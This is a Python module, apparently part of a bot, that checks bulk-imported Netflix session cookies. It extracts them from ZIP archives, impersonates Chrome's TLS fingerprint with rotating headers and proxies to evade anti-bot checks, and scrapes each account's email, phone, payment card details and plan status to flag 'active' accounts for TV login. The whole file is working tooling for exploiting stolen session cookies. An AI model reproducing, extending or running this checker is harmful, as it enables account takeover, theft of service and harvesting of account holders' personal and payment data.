"""
fast_checker.py — High-performance Netflix cookie checker for the TV Login Bot.

Ported from Netflix Cookie Checker's proven approach:
- curl_cffi with Chrome120 TLS impersonation (bypasses anti-bot)
- Thread-local session pool with connection reuse
- Adaptive rate limiting
- ThreadPoolExecutor for parallel checking
- Smart proxy support with fallback to direct

Usage (from async code):
    from fast_checker import check_cookie_sync, extract_zip_cookies
    result = await asyncio.to_thread(check_cookie_sync, cookie_dict, proxy_url)
"""

import re
import time
import random
import threading
import zipfile
import io
import logging
from curl_cffi import requests as curl_requests

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════
# SESSION POOL — Thread-local, Chrome120 TLS impersonation
# ═══════════════════════════════════════════════════════════════
_session_pool = {}
_session_pool_lock = threading.Lock()
_rate_limit_lock = threading.Lock()
_request_times = []



def _get_session():
    """Get or create a thread-local curl_cffi session with Chrome120 impersonation."""
    tid = threading.get_ident()
    with _session_pool_lock:
        if tid not in _session_pool:
            session = curl_requests.Session(impersonate="chrome120")
            session.timeout = 20
            _session_pool[tid] = session
        return _session_pool[tid]


def _close_session():
    """Close and remove the thread-local session."""
    tid = threading.get_ident()
    with _session_pool_lock:
        if tid in _session_pool:
            try:
                _session_pool[tid].close()
            except Exception:
                pass
            del _session_pool[tid]


def _manage_rate_limit():
    """Adaptive rate limiting — prevents Netflix 429s."""
    with _rate_limit_lock:
        now = time.time()
        _request_times[:] = [t for t in _request_times if now - t < 10]
        if len(_request_times) > 200:
            _request_times[:] = _request_times[-100:]

        if len(_request_times) < 10:
            _request_times.append(now)
            return

        if len(_request_times) >= 100:
            sleep_time = random.uniform(0.15, 0.3)
        elif len(_request_times) >= 50:
            sleep_time = random.uniform(0.05, 0.15)
        else:
            sleep_time = random.uniform(0.02, 0.08)

        _request_times.append(now)

    time.sleep(sleep_time)


# ═══════════════════════════════════════════════════════════════
# HEADERS — Realistic Chrome browser headers
# ═══════════════════════════════════════════════════════════════
def _get_random_headers():
    chrome_versions = ['131.0.0.0', '130.0.0.0', '129.0.0.0', '128.0.0.0']
    chrome_ver = random.choice(chrome_versions)
    major_ver = chrome_ver.split('.')[0]

    platforms = [
        ('Windows NT 10.0; Win64; x64', '"Windows"', '"15.0.0"'),
        ('Macintosh; Intel Mac OS X 10_15_7', '"macOS"', '"15.2.0"'),
        ('X11; Linux x86_64', '"Linux"', '"6.5.0"'),
    ]
    platform, platform_name, platform_ver = random.choice(platforms)

    return {
        'User-Agent': f'Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'sec-ch-ua': f'"Google Chrome";v="{major_ver}", "Chromium";v="{major_ver}", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': platform_name,
        'Cache-Control': 'max-age=0',
        'Referer': 'https://www.netflix.com/browse',
    }


# ═══════════════════════════════════════════════════════════════
# CORE REQUEST — curl_cffi with Chrome TLS, proxy, retries
# ═══════════════════════════════════════════════════════════════
def _make_request(cookies, proxy_url=None, retry_count=0):
    """
    Make request to Netflix /Account using curl_cffi Chrome120 impersonation.
    Returns (response_text, status_code).
    """
    max_retries = 3

    _manage_rate_limit()

    if retry_count == 0:
        time.sleep(random.uniform(0.02, 0.2))

    if retry_count > 0:
        _close_session()

    session = _get_session()
    session.cookies.clear()
    session.cookies.update(cookies)

    headers = _get_random_headers()

    kwargs = {
        "headers": headers,
        "timeout": 15 + (retry_count * 5),
        "allow_redirects": True,
    }
    if proxy_url:
        kwargs["proxy"] = proxy_url

    try:
        response = session.get("https://www.netflix.com/YourAccount", **kwargs)

        if response.status_code == 429:
            if retry_count < max_retries:
                delay = (2.0 ** retry_count) + random.uniform(1, 3)
                time.sleep(delay)
                return _make_request(cookies, proxy_url, retry_count + 1)
            return None, 429

        if response.status_code == 200:
            return response.text, 200
        else:
            if retry_count < max_retries and response.status_code >= 500:
                delay = (1.5 ** retry_count) + random.uniform(0.5, 1.5)
                time.sleep(delay)
                return _make_request(cookies, proxy_url, retry_count + 1)
            return "", response.status_code

    except Exception as e:
        if retry_count < max_retries:
            backoff = (2.0 ** retry_count) + random.uniform(0.5, 2.0)
            time.sleep(backoff)
            _close_session()
            return _make_request(cookies, proxy_url, retry_count + 1)
        else:
            _close_session()
            return "", 0


# ═══════════════════════════════════════════════════════════════
# CHECK COOKIE — Full validation (same logic as reference checker)
# ═══════════════════════════════════════════════════════════════
def check_cookie_sync(cookie_dict, proxy_url=None):
    """
    Check a single Netflix cookie. SYNCHRONOUS — call via asyncio.to_thread().

    Returns dict:
        'valid': bool — cookie works (account info extractable)
        'status': str — 'active', 'on_hold', 'free', 'invalid'
        'info': dict or None
        'error': str or None
        'transient': bool — True when the check itself failed (rate-limit, no
            network response, proxy down) and we could NOT reach Netflix to get
            a real answer. This is NOT one of Netflix's real account states
            (Active/On-Hold/Free/Invalid/Duplicate) — it just means "unknown,
            try again later". Callers (e.g. auto_verify_cookies) MUST check this
            before deleting/invalidating a cookie: a transient failure must never
            be treated the same as a confirmed-invalid cookie, or a proxy outage
            / Netflix rate-limit during the 24h sweep would wipe out perfectly
            good ACTIVE cookies for every one of the bot's users.
    """
    result = {'valid': False, 'status': 'invalid', 'info': None, 'error': None, 'transient': False}

    if not cookie_dict:
        result['error'] = "Empty cookies"
        return result

    # Pre-check 1: Must have Netflix auth cookies
    if 'NetflixId' not in cookie_dict and 'SecureNetflixId' not in cookie_dict:
        result['error'] = "Missing Netflix auth cookies"
        return result

    # Pre-check 2: dsca=customer = cancelled/unsubscribed
    if cookie_dict.get('dsca', '').lower() == 'customer':
        result['error'] = "Account unsubscribed"
        result['status'] = 'free'
        return result

    # Make request with proxy (or direct)
    response_text, status_code = _make_request(cookie_dict, proxy_url)

    if status_code == 429:
        # BUG FIX: rate-limiting means Netflix refused to answer at all — it says
        # nothing about whether the cookie is good or bad. Previously this set
        # 'invalid' (the dict default) with no marker, so auto_verify_cookies
        # deleted the cookie as if Netflix had confirmed it dead.
        result['error'] = "Rate limited"
        result['transient'] = True
        return result

    if not response_text:
        # Fallback: if proxy failed, try direct
        if proxy_url:
            response_text, status_code = _make_request(cookie_dict, proxy_url=None)
            if not response_text:
                # BUG FIX: same issue — no response from Netflix (network/proxy
                # failure) is not a confirmed-invalid verdict. Mark transient so
                # the cookie survives to be re-checked next cycle instead of
                # being permanently deleted over a connectivity blip.
                result['error'] = f"No response (status: {status_code})"
                result['transient'] = True
                return result
        else:
            result['error'] = f"No response (status: {status_code})"
            result['transient'] = True
            return result

    # Check for login redirect (cookie expired)
    if 'login' in response_text.lower() or 'signin' in response_text.lower():
        if 'account' not in response_text.lower():
            result['error'] = "Cookie expired"
            result['status'] = 'invalid'
            return result

    # Extract account info
    info = _extract_info(response_text)

    if info.get('planName') or info.get('memberSince'):
        result['valid'] = True
        result['info'] = info
        # Classify: active / on_hold / free
        result['status'] = _classify_account_status(info)
    else:
        result['error'] = "Could not extract account info"
        result['status'] = 'invalid'

    return result


def _clean_value(value):
    """Decode hex/unicode escapes and clean extracted values (ported from reference)."""
    if not value or value in ('None', 'null', 'Unknown', ''):
        return None
    if isinstance(value, str):
        # Decode \\x40 → @, \\xNN → char
        try:
            value = re.sub(r'\\x([0-9a-fA-F]{2})',
                           lambda m: chr(int(m.group(1), 16)), value)
        except Exception:
            pass
        # Decode \\uNNNN → char
        try:
            value = re.sub(r'\\u([0-9a-fA-F]{4})',
                           lambda m: chr(int(m.group(1), 16)), value)
        except Exception:
            pass
        value = value.strip().replace('\x00', '').replace('\r', '')
        value = ' '.join(value.split())
    return value if value else None


def _extract_info(text):
    """
    Extract Netflix account details from /YourAccount HTML response.
    Ported from Netflix Cookie Checker's extract_netflix_info() with ALL patterns.
    """
    # Pre-process: decode \\xNN and \\uNNNN in the raw HTML BEFORE pattern matching
    # This fixes emails like vavaratana\\x40gmail.com → vavaratana@gmail.com
    try:
        text = re.sub(r'\\x([0-9a-fA-F]{2})',
                      lambda m: chr(int(m.group(1), 16)), text)
    except Exception:
        pass
    try:
        text = re.sub(r'\\u([0-9a-fA-F]{4})',
                      lambda m: chr(int(m.group(1), 16)), text)
    except Exception:
        pass

    info = {}

    # ═══ Pattern-based extraction (same as reference checker) ═══
    patterns = {
        'country': [
            r'"countryOfSignup"\s*:\s*"([^"]+)"',
            r'"country"\s*:\s*"([^"]+)"',
            r'"countryCode"\s*:\s*"([^"]+)"',
        ],
        'email': [
            r'"memberEmail"\s*:\s*\{\s*"__typename"\s*:\s*"GrowthClearStringValue"\s*,\s*"value"\s*:\s*"([^"]+@[^"]+)"',
            r'"growthMemberEmail"\s*:\s*\{[^}]*"memberEmail"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+@[^"]+)"',
            r'"email"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+@[^"]+)"',
            r'"email"\s*:\s*"([^"]+@[^"]+)"',
            r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"',
            r'"userEmail"\s*:\s*"([^"]+@[^"]+)"',
        ],
        'memberSince': [
            r'"memberSince"\s*:\s*\{\s*"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"memberSince"\s*:\s*"([^"]+)"',
        ],
        'planName': [
            r'"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*\{\s*"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"isChangePlanEligible"\s*:\s*(?:true|false)\s*,\s*"name"\s*:\s*"([^"]+)"',
            r'"planName"\s*:\s*"([^"]+)"',
        ],
        'planPrice': [
            r'"planPrice"\s*:\s*\{\s*"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"planPrice"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
            r'"monthlyPrice"\s*:\s*"([^"]+)"',
        ],
        'videoQuality': [
            r'"videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"videoQuality"\s*:\s*"([^"]+)"',
            r'"maxResolution"\s*:\s*"([^"]+)"',
        ],
        'maxStreams': [
            r'"maxStreams"\s*:\s*\{\s*"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d+)',
            r'"maxConcurrentStreams"\s*:\s*(\d+)',
        ],
        'nextBillingDate': [
            r'"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'"renewalBillingDate"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"',
            r'"billingDate"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"',
            r'"billingDate"\s*:\s*"([^"]+)"',
        ],
        'membershipStatus': [
            r'"membershipStatus"\s*:\s*"([^"]+)"',
            r'"accountStatus"\s*:\s*"([^"]+)"',
        ],
        'isOnHold': [
            r'"growthHoldMetadata"\s*:\s*\{\s*"__typename"\s*:\s*"GrowthHoldMetadata"\s*,\s*"isUserOnHold"\s*:\s*(true|false)',
            r'"isUserOnHold"\s*:\s*(true|false)',
        ],
        'isPlaybackAllowed': [
            r'"isPlaybackAllowed"\s*:\s*(true|false)',
            r'"canWatch"\s*:\s*(true|false)',
            r'"isStreamable"\s*:\s*(true|false)',
        ],
        'isInFreeTrial': [
            r'"isInFreeTrial"\s*:\s*(true|false)',
        ],
        'showAddPaymentMethod': [
            r'"showAddPaymentMethodAction"\s*:\s*\{\s*"fieldType"\s*:\s*"Boolean"\s*,\s*"value"\s*:\s*(true|false)',
            r'"showAddPaymentMethod"\s*:\s*(true|false)',
        ],
        'isCancelled': [
            r'"isCancelled"\s*:\s*(true|false)',
            r'"membershipCancelled"\s*:\s*(true|false)',
        ],
        'membershipEndDate': [
            r'"membershipEndDate"\s*:\s*\{\s*"fieldType"\s*:\s*"[^"]+"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"membershipEndDate"\s*:\s*"([^"]+)"',
        ],
        'cardBrand': [
            r'"cardBrand"\s*:\s*"([^"]+)"',
            r'"brand"\s*:\s*"([^"]+)"',
            r'"paymentInstrumentType"\s*:\s*"([^"]+)"',
            r'"billingPartnerName"\s*:\s*"([^"]+)"',
        ],
        'paymentMethod': [
            r'"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"',
            r'"paymentType"\s*:\s*"([^"]+)"',
            r'"methodOfPayment"\s*:\s*"([^"]+)"',
        ],
        'last4Digits': [
            r'"last4Digits"\s*:\s*"([^"]+)"',
        ],
        'phone': [
            r'"phoneNumberDigits"\s*:\s*\{[^}]*"value"\s*:\s*"([^"]+)"',
            r'"phoneNumber"\s*:\s*"([^"]+)"',
            r'"phone"\s*:\s*"([^"]+)"',
        ],
    }

    for field, pattern_list in patterns.items():
        for pattern in pattern_list:
            match = re.search(pattern, text)
            if match:
                value = _clean_value(match.group(1))
                if value:
                    # Skip bad date values
                    if field in ('nextBillingDate',) and ('.localDate.' in value or 'enabled' in value.lower()):
                        continue
                    info[field] = value
                    break

    # ═══ MemberPlan JSON block fallback (catches plan in any language) ═══
    if not info.get('planName') or not info.get('videoQuality'):
        try:
            plan_match = re.search(
                r'"fieldGroup"\s*:\s*"MemberPlan"\s*,\s*"fields"\s*:\s*\{(.{0,600})\}\}',
                text
            )
            if plan_match:
                block = plan_match.group(1)
                if not info.get('planName'):
                    m = re.search(r'"localizedPlanName"[^}]*"value"\s*:\s*"([^"]+)"', block)
                    if m:
                        info['planName'] = _clean_value(m.group(1))
                if not info.get('planPrice'):
                    m = re.search(r'"planPrice"[^}]*"value"\s*:\s*"([^"]+)"', block)
                    if m:
                        info['planPrice'] = _clean_value(m.group(1))
                if not info.get('videoQuality'):
                    m = re.search(r'"videoQuality"[^}]*"value"\s*:\s*"([^"]+)"', block)
                    if m:
                        info['videoQuality'] = _clean_value(m.group(1))
                if not info.get('maxStreams'):
                    m = re.search(r'"maxStreams"[^}]*"value"\s*:\s*(\d+)', block)
                    if m:
                        info['maxStreams'] = m.group(1)
        except Exception:
            pass

    # ═══ Fallbacks from plan name ═══
    if not info.get('videoQuality') and info.get('planName'):
        pn = info['planName'].lower()
        if 'premium' in pn:
            info['videoQuality'] = 'UHD'
        elif 'standard' in pn:
            info['videoQuality'] = 'HD'
        elif 'basic' in pn:
            info['videoQuality'] = 'HD'

    if not info.get('maxStreams') and info.get('planName'):
        pn = info['planName'].lower()
        if 'premium' in pn:
            info['maxStreams'] = '4'
        elif 'standard' in pn:
            info['maxStreams'] = '2'
        elif 'basic' in pn:
            info['maxStreams'] = '1'

    return info


# ═══════════════════════════════════════════════════════════════
# ACCOUNT STATUS CLASSIFICATION (ported from netflix_checker.py)
# ═══════════════════════════════════════════════════════════════
def _classify_account_status(info):
    """
    Classify account as 'active', 'on_hold', or 'free'.
    Uses Netflix's own signals — same logic as Netflix Checker's Universal Status Detection.
    Only 'active' accounts should be used for TV activation.
    """
    _true = lambda v: v in ('true', True)

    raw_status = info.get('membershipStatus', '')
    is_on_hold = _true(info.get('isOnHold'))
    is_playback_allowed = _true(info.get('isPlaybackAllowed'))
    is_free_trial = _true(info.get('isInFreeTrial'))
    show_add_payment = _true(info.get('showAddPaymentMethod'))
    is_cancelled = _true(info.get('isCancelled'))
    has_end_date = bool(info.get('membershipEndDate'))

    has_any_payment = bool(
        info.get('paymentMethod') or info.get('cardBrand') or
        info.get('last4Digits')
    )

    # RULE 1: isPlaybackAllowed=true → ACTIVE (overrides everything)
    if is_playback_allowed:
        return 'active'

    # RULE 2: isUserOnHold=true → On Hold
    if is_on_hold:
        return 'on_hold'

    # RULE 3: FORMER_MEMBER / NEVER_MEMBER → Free
    if raw_status in ('FORMER_MEMBER', 'NEVER_MEMBER'):
        return 'free'

    # RULE 4: CURRENT_MEMBER with no payment + show add payment → On Hold
    if raw_status == 'CURRENT_MEMBER' and not has_any_payment and show_add_payment:
        return 'on_hold'

    # RULE 5: CURRENT_MEMBER with no payment + no show add payment → Free
    if raw_status == 'CURRENT_MEMBER' and not has_any_payment and not show_add_payment and not is_free_trial:
        return 'free'

    # RULE 6: CURRENT_MEMBER with payment → Active
    if raw_status == 'CURRENT_MEMBER':
        return 'active'

    # Default: if planName exists, assume active
    if info.get('planName'):
        return 'active'

    return 'free'


# ═══════════════════════════════════════════════════════════════
# ZIP EXTRACTION — Fast, handles all formats
# ═══════════════════════════════════════════════════════════════
def _get_pg_id(cookie_dict):
    """Extract pg= parameter from NetflixId to identify unique accounts."""
    nfid = cookie_dict.get('NetflixId', '')
    import urllib.parse
    try:
        decoded = urllib.parse.unquote(nfid)
    except Exception:
        decoded = nfid
    m = re.search(r'pg[=%3D]+([A-Z0-9]+)', decoded, re.IGNORECASE)
    if m:
        return m.group(1)
    # Fallback: first 60 chars of NetflixId as fingerprint
    return nfid[:60] if nfid else None


def extract_zip_cookies(zip_data):
    """
    Extract cookies from ZIP file bytes. Returns list of (filename, cookie_dict).
    Handles Netscape, JSON, and header-style cookies.
    Deduplicates by pg= parameter from NetflixId.
    """
    results = []
    try:
        zf = zipfile.ZipFile(io.BytesIO(zip_data))
    except zipfile.BadZipFile:
        return results

    # ZIP Bomb Protection 1: Check total file entry count
    if len(zf.infolist()) > 10000:
        return results

    seen_pg_ids = set()

    for zip_info in zf.infolist():
        name = zip_info.filename
        if name.startswith("__MACOSX") or name.endswith("/"):
            continue
        if not name.lower().endswith((".txt", ".json")):
            continue

        # ZIP Bomb Protection 2: Skip maliciously huge files (>2MB)
        if zip_info.file_size > 2 * 1024 * 1024:
            continue

        try:
            raw = zf.read(name).decode("utf-8", errors="replace")
            cookies = _parse_cookies(raw)
            if cookies:
                # Deduplicate by pg= parameter
                pg_id = _get_pg_id(cookies)
                if pg_id and pg_id in seen_pg_ids:
                    logger.debug(f"Skipping duplicate account: {name} (pg={pg_id[:20]}...)")
                    continue
                if pg_id:
                    seen_pg_ids.add(pg_id)
                results.append((name, cookies))
        except Exception:
            continue

    return results


def _parse_cookies(content):
    """Parse Netscape, JSON, or header-style cookies from text content."""
    cookies = {}

    # 1. Netscape tab-separated format
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]

    if cookies:
        return cookies

    # 2. JSON format
    import json as _json
    try:
        data = _json.loads(content)
        COOKIE_KEYS = ('NetflixId', 'SecureNetflixId', 'nfvdid', 'OptanonConsent')
        if isinstance(data, list):
            for cookie in data:
                if isinstance(cookie, dict):
                    name = cookie.get('name')
                    value = cookie.get('value')
                    if name and isinstance(value, str):
                        cookies[name] = value
        elif isinstance(data, dict):
            if any(k in data for k in COOKIE_KEYS):
                for k in COOKIE_KEYS:
                    v = data.get(k)
                    if isinstance(v, str):
                        cookies[k] = v
            elif isinstance(data.get('cookies'), list):
                for cookie in data['cookies']:
                    if isinstance(cookie, dict):
                        name = cookie.get('name')
                        value = cookie.get('value')
                        if name and isinstance(value, str):
                            cookies[name] = value
        if cookies:
            return cookies
    except (_json.JSONDecodeError, ValueError):
        pass

    # 3. Header-style: NetflixId=xxx; SecureNetflixId=xxx
    for line in content.split('\n'):
        match = re.search(r'(NetflixId\s*=)', line)
        if match:
            cookie_str = line[match.start():]
            if ' | ' in cookie_str:
                cookie_str = cookie_str.split(' | ')[0]
            for pair in re.split(r';\s*', cookie_str):
                pair = pair.strip()
                if '=' in pair:
                    name, value = pair.split('=', 1)
                    name = name.strip()
                    value = value.strip()
                    if name and re.match(r'^[a-zA-Z_]', name):
                        cookies[name] = value
            if cookies:
                return cookies

    return cookies


# bulk_check_cookies() was removed — the bot checks cookies one at a time via
# netflix_adapter.check_cookie_sync (called from admin_handlers.py and bot.py);
# no parallel bulk-import path is used.
